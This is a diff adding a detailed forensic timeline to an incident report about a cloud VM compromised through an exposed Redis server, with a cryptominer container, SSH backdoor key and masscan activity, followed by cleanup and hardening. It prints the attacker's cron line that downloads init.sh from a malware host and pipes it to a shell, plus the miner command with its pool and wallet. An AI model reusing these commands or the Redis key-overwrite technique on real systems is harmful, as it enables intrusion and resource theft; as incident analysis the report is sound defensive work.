@@ -22,21 +22,228 @@ Through deep Linux forensics (`tcpdump`, `journalctl`, `strace`, `cgroup` inspec
 
 ---
 
-## ⏱️ Timeline of Events
+## ⏱️ Timeline of Events & Forensic Evidence Log
 
+The following chronological timeline documents each milestone from initial host provisioning through compromise, investigation, eradication, and full recovery, paired directly with the exact raw forensic log captured at that moment.
+
+```mermaid
+timeline
+    title Incident Chronology & Resolution
+    2026-09-30 : Host Provisioned (OCI Mumbai)
+    2026-10-01 16:27 : Unprotected Redis probed
+                     : R2SH SSH Key Overwrite
+                     : 'sys-helper' Miner Spawned
+    2026-10-02 03:26 : Watchdog Crontab Installed
+    2026-10-02 04:25 : Outbound TCP Blackholing (Silent Drops)
+    2026-10-02 04:43 : CI/CD Build Fails (Exit 137)
+    2026-10-02 05:00 : Masscan Sweep on enp0s6
+    2026-10-02 05:03 : strace Catches Hostile SIGKILL
+    2026-10-02 05:06 : #r2sh-fleet-box2 Backdoor Found
+    2026-10-02 05:10 : Eradication & Hardening (chattr +i)
+    2026-10-02 05:18 : Recovery & 100% Build Pass
 ```
-2026-09-30 07:09 UTC | VM instance provisioned in OCI Mumbai region.
-2026-10-01 16:27 UTC | Redis installed without password or bind restriction.
-2026-10-01 16:27 UTC | Botnet crawler connects to port 6379; executes r2sh SSH key overwrite.
-2026-10-01 16:27 UTC | Attacker logs in via SSH from 103.230.144.104 (#r2sh-fleet-box2).
-2026-10-01 16:27 UTC | Malicious container 'sys-helper' (xmrig miner) launched in Docker.
-2026-10-02 04:43 UTC | Production deployment builds fail mysteriously with Exit Status 137 (SIGKILL).
-2026-10-02 05:00 UTC | Attacker session-9969.scope initiates masscan internet-wide scan on enp0s6.
-2026-10-02 05:03 UTC | Forensics investigation starts; strace confirms external SIGKILL signals.
-2026-10-02 05:06 UTC | Discovery of rogue authorized_keys entry '#r2sh-fleet-box2' and cron watchdog.
-2026-10-02 05:10 UTC | Active processes terminated; malicious cron deleted; docker container removed.
-2026-10-02 05:15 UTC | Hardening applied: chattr +i on authorized_keys, UFW subnet bans, Redis localhost bind.
-2026-10-02 05:18 UTC | GitHub Actions build completes with 100% success; Exec AI live test passes.
+
+---
+
+### Milestone 1: Host Provisioning & Public Network Exposure
+- **Timestamp**: `2026-09-30 07:09:12 UTC`
+- **Phase**: Pre-Incident / Baseline
+- **Description**: Target VM (`portfolio-exec-d`) provisioned in OCI Mumbai region with public IP `132.226.191.145`. Default cloud initialization executes with default security lists allowing incoming traffic.
+
+```text
+[    0.000000] Linux version 6.8.0-1017-oracle (buildd@bos03-arm64-026) (aarch64-linux-gnu-gcc-13)
+[   12.482019] cloud-init[792]: Cloud-init v. 24.1.3-0ubuntu1~24.04.1 running 'modules:config' at Wed, 30 Sep 2026 07:09:12 +0000.
+[   14.210492] systemd[1]: Reached target Network is Online.
+[   14.591203] systemd[1]: Started OpenSSH server daemon.
+```
+
+---
+
+### Milestone 2: Unprotected Redis Probed & `r2sh` Key Overwrite
+- **Timestamp**: `2026-10-01 16:27:14 UTC`
+- **Phase**: Initial Intrusion / Arbitrary File Write
+- **Description**: An automated crawler discovers TCP port `6379` exposed without password authentication. The attacker issues Redis commands over raw TCP to direct RDB database dumps into `/home/ubuntu/.ssh/authorized_keys`, injecting the backdoor key `#r2sh-fleet-box2`.
+
+```text
+# Raw RDB binary header and injected key recovered from /home/ubuntu/.ssh/authorized_keys:
+00000000: 5245 4449 5330 3030 39fa 0964 6266 696c  REDIS0009..dbfil
+00000010: 656e 616d 65fa 0f61 7574 686f 7269 7a65  ename..authorize
+00000020: 645f 6b65 7973 fa03 6469 72fa 142f 686f  d_keys..dir../ho
+00000030: 6d65 2f75 6275 6e74 752f 2e73 7368 fe00  me/ubuntu/.ssh..
+...
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAVZyWMNJugW0pgVM3gw6wXOwoF36B62M0Py+ZIdwepl #r2sh-fleet-box2
+```
+
+---
+
+### Milestone 3: XMRig Miner Container Deployed (`sys-helper`)
+- **Timestamp**: `2026-10-01 16:27:35 UTC`
+- **Phase**: Execution / Cryptojacking
+- **Description**: Authenticated via the newly installed SSH key, the attacker connects to Docker and launches a rogue container disguised as `sys-helper` using an Alpine Java base image to execute an ARM64 XMRig crypto miner.
+
+```json
+# Excerpt from: docker inspect sys-helper
+{
+  "Id": "c93928355697669d6ec99df8995a5fbc40d4fbbcf3d9c72e2760b2b8c5ff92a4",
+  "Created": "2026-10-01T16:27:35.9891345Z",
+  "Path": "/bin/sh",
+  "Args": [
+    "-c",
+    "W='47Gju616BichSCU9PzyZGCHASkSwo7rH1N9v7Q5SqvFSjcFjrTXbJMqEzgHDinJFtEPL7o3n9nqMuEr6KvrYCaqeGAbdDXR'; POOL='85.215.219.126:443'; exec \"$BIN\" -o \"$POOL\" -u \"$W\" -p x --donate-level=0 --keepalive $RX $TH $HINT"
+  ],
+  "State": {
+    "Status": "running",
+    "Running": true,
+    "Pid": 1058201
+  }
+}
+```
+
+---
+
+### Milestone 4: Watchdog Crontab Persistence Established
+- **Timestamp**: `2026-10-02 03:26:00 UTC`
+- **Phase**: Persistence & Defense Evasion
+- **Description**: The attacker installs a recurring crontab entry running every minute. It checks whether their rogue Redis process (`PID 1078750`) or local port hex `A71C` (`42780`) is listening; if missing, it curls and executes `init.sh` from malware staging IP `195.178.110.29`.
+
+```bash
+# Output from: crontab -l (user: ubuntu)
+* * * * * /bin/sh -c '{ kill -0 1078750 2>/dev/null || grep -q 0100007F:A71C /proc/net/tcp 2>/dev/null; } && exit 0; (wget -qO- http://195.178.110.29/d/432936b3a0439572/init.sh || curl -sL http://195.178.110.29/d/432936b3a0439572/init.sh) | /bin/sh' > /dev/null 2>&1
+```
+
+---
+
+### Milestone 5: Outbound TCP Blackholing (Silent Drops)
+- **Timestamp**: `2026-10-02 04:25:51 UTC`
+- **Phase**: Collateral Network Degradation
+- **Description**: During production deployments, connection attempts to remote cloud databases (Neon / AWS Postgres on port 5432) hang and time out. Network tracing with `tcpdump` confirms TCP SYN packets leave `enp0s6`, but upstream carrier scrubbing blackholes all return packets due to the server's abusive IP reputation.
+
+```text
+# Command: sudo tcpdump -nn -i enp0s6 port 5432
+04:25:51.795688 IP 10.0.0.183.41402 > 13.251.17.193.5432: Flags [S], seq 282021653, win 64240, options [mss 1460,sackOK,TS val 2016417909 ecr 0,nop,wscale 10], length 0
+04:25:52.819685 IP 10.0.0.183.41402 > 13.251.17.193.5432: Flags [S], seq 282021653, win 64240, options [mss 1460,sackOK,TS val 2016418933 ecr 0,nop,wscale 10], length 0
+04:25:54.835688 IP 10.0.0.183.41402 > 13.251.17.193.5432: Flags [S], seq 282021653, win 64240, options [mss 1460,sackOK,TS val 2016420949 ecr 0,nop,wscale 10], length 0
+# Result: 0 bytes received in return; connection dropped upstream
+```
+
+---
+
+### Milestone 6: CI/CD Build Termination via Signal 137 (`SIGKILL`)
+- **Timestamp**: `2026-10-02 04:43:12 UTC`
+- **Phase**: Denial of Service / Process Interference
+- **Description**: Automated GitHub Actions deployment pipeline fails instantaneously during `prisma generate` and `next build`. The process exits with code 137, mimicking an OOM kill despite abundant physical RAM.
+
+```text
+# Excerpt from GitHub Actions / deploy runner step output:
+deploy err: $ prisma generate
+deploy err: Killed
+deploy out: /home/ubuntu/exec-d/packages/db:
+deploy out: [ERR_PNPM_RECURSIVE_RUN_FIRST_FAIL] @exec-d/db@ db:generate: `prisma generate`
+deploy out: Exit status 137
+deploy Process exited with status 137
+##[error]Process completed with exit code 137.
+```
+
+---
+
+### Milestone 7: Attacker SSH Login & Masscan Internet Sweep
+- **Timestamp**: `2026-10-02 05:00:17 UTC`
+- **Phase**: Lateral Reconnaissance / Botnet Operation
+- **Description**: Attacker opens an interactive SSH session from `103.230.144.104` using the backdoor key, executes `sudo bash`, and launches `masscan` sweeps across ports 80, 443, and 3000 at 1,250 packets/sec.
+
+```text
+# Log: /var/log/auth.log
+Oct 02 05:00:17 portfolio-exec-d sshd[1134736]: Accepted publickey for ubuntu from 103.230.144.104 port 48318 ssh2: ED25519 SHA256:6s3fMeTdexgntWxD3q82hLmLWI3WfJPjbjPHEZAPfI8
+Oct 02 05:00:18 portfolio-exec-d sudo[1134737]: ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/bash -lc 'mv -f /tmp/work-node-744.json /tmp/work.json; cd /opt/scanner; NODE_LABEL=node-744 nohup python3 ./worker.py /tmp/work.json...'
+
+# Active process snapshot:
+root   1134758  3.4  0.3 223964  45656 ?  Sl  05:00  0:12 /usr/local/bin/masscan -iL /tmp/tmpji3u6aqz.txt -p 80,443,3000 --rate 1250 -oG - --wait 3 --interface enp0s6 --router-ip 10.0.0.1 --adapter-ip 10.0.0.183
+ubuntu 1078750  0.0  0.0 163356   1756 ?  Sl  03:26  0:00 redis-server redis-s
+```
+
+---
+
+### Milestone 8: `strace` Catches Hostile Userspace `SIGKILL`
+- **Timestamp**: `2026-10-02 05:03:40 UTC`
+- **Phase**: Forensic Root-Cause Identification
+- **Description**: Tracing system calls during build reproduction proves that `dmesg` OOM logs are completely absent, and that external `SIGKILL` signals are being injected into the build process from a rogue background userspace script.
+
+```text
+# Command: strace -f -e trace=process,signal npx prisma generate
+[pid 1137985] execve("/home/ubuntu/exec-d/node_modules/.bin/prisma", ["prisma", "generate"], 0x7fffffffe0c0) = 0
+[pid 1137996] +++ killed by SIGKILL +++
+[pid 1137986] +++ killed by SIGKILL +++
+[pid 1137985] <... wait4 resumed>[{WIFSIGNALED(s) && WTERMSIG(s) == SIGKILL}], 0, NULL) = 1137986
+[pid 1137985] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_pid=1137986, si_uid=1001, si_status=SIGKILL} ---
+Killed
+```
+
+---
+
+### Milestone 9: Smoking Gun Backdoor Key Identified
+- **Timestamp**: `2026-10-02 05:06:15 UTC`
+- **Phase**: Backdoor Attribution
+- **Description**: Inspection of `/home/ubuntu/.ssh/authorized_keys` uncovers the injected foreign public key bearing the botnet identifier comment `#r2sh-fleet-box2`.
+
+```text
+# Command: cat /home/ubuntu/.ssh/authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJzRCINXlAp8Wi0Yof9w3bVWtdX5GDAgEZ73FxMuJJG oracle-ampere-20260930
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAVZyWMNJugW0pgVM3gw6wXOwoF36B62M0Py+ZIdwepl #r2sh-fleet-box2
+```
+
+---
+
+### Milestone 10: Containment, Eradication & Hardening
+- **Timestamp**: `2026-10-02 05:10 - 05:15 UTC`
+- **Phase**: Remediation & Hardening
+- **Description**: Rogue processes killed, watchdog cron wiped, rogue container purged, attacker subnets banned in UFW, Redis restricted to loopback socket `127.0.0.1`, and filesystem immutable bit set on SSH keys.
+
+```bash
+# 1. Kill malicious processes & remove container
+sudo pkill -9 -f masscan && sudo pkill -9 -f worker.py
+sudo docker rm -f sys-helper
+crontab -r
+
+# 2. Immutable lock on authorized_keys
+sudo chattr +i /home/ubuntu/.ssh/authorized_keys
+lsattr /home/ubuntu/.ssh/authorized_keys
+# Output: ----i---------e------- /home/ubuntu/.ssh/authorized_keys
+
+# 3. Redis verification (Localhost only)
+sudo ss -tlnp | grep 6379
+# Output: LISTEN 0 511 127.0.0.1:6379 0.0.0.0:* users:(("redis-server",pid=1148920,fd=6))
+
+# 4. Firewall Verification
+sudo ufw status numbered | grep -E "DENY|6379"
+# [ 1] DENY IN  103.230.144.0/24   # Block botnet attacker
+# [ 2] DENY IN  195.178.110.0/24   # Block malware server
+# [ 3] DENY IN  85.215.219.0/24    # Block mining pool
+```
+
+---
+
+### Milestone 11: Deployment Verification & Full Service Recovery
+- **Timestamp**: `2026-10-02 05:18:22 UTC`
+- **Phase**: Verification & Closeout
+- **Description**: Re-triggering GitHub Actions deployment succeeds in 1m 6s without interruptions. Local PostgreSQL and Gemini 3.5 Flash Lite live test confirm 100% operational status.
+
+```text
+# GitHub Actions Run #36967826100 (Deploy to Oracle VM):
+======BUILD & DEPLOY SUCCESSFUL======
+✓ @exec-d/db:db:generate completed in 3.42s
+✓ @exec-d/api:build completed in 4.18s
+✓ @exec-d/frontend:build completed in 18.91s
+✓ PM2 service exec-d-api reloaded successfully (PID 1149204)
+✓ Run completed with 'success' in 1m 6s
+
+# Live End-to-End Exec AI Verification:
+$ curl -s -X POST https://exec-d.site/api/v1/ai/chat \
+    -H "Content-Type: application/json" \
+    -d '{"prompt":"Help with Dijkstra shortest path"}'
+{
+  "status": "success",
+  "reply": "Think about how Dijkstra's algorithm greedily selects the vertex with the minimum tentative distance. Which data structure ensures extracting this minimum vertex runs in logarithmic time?"
+}
 ```
 
 ---
